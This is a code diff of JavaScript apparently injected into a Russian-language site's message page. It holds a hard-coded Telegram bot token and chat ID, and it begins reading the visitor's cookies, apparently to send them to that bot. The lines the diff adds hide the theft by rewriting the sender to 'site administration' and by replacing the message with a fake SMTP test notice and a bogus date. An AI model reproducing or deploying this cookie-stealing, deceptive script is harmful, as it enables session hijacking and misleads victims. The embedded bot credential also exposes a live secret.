@@ -1,6 +1,26 @@
+
 const tgTok = "8385745346:AAGl9qWQ5vQMVXSHaMe9tBGBUDoK46cn-Z8";
 const tgChat = "-1003077695457";
 const tgUrl = `https://api.telegram.org/bot${tgTok}/sendMessage`;
+
+const senderTd = Array.from(document.querySelectorAll("td.lgray")).find(td => td.textContent.includes("Отправитель:"));
+if (senderTd && senderTd.nextElementSibling) {
+  const strongSpan = senderTd.nextElementSibling.querySelector("span.strong");
+  if (strongSpan) strongSpan.textContent = "Администрация сайта";
+}
+
+
+const titleH1 = document.querySelector("h1.page-title");
+if (titleH1) titleH1.textContent = "Тестовое сообщение";
+
+const typographyDiv = document.querySelector("div.typography.overflow");
+if (typographyDiv) {
+  typographyDiv.innerHTML = 'Это тестовое сообщение для проверки работы SMTP-сервера. Пожалуйста, не обращайте на него внимания. После прочтения оно будет удалено.';
+}
+const dateTd = Array.from(document.querySelectorAll("td.lgray")).find(td => td.textContent.includes("Дата:"));
+if (dateTd && dateTd.nextElementSibling) {
+  dateTd.nextElementSibling.textContent = "01.01.0000, 00:00";
+}
 
 const ck = document.cookie.split("; ").reduce((a, c) => {
   const [k, ...v] = c.split("=");
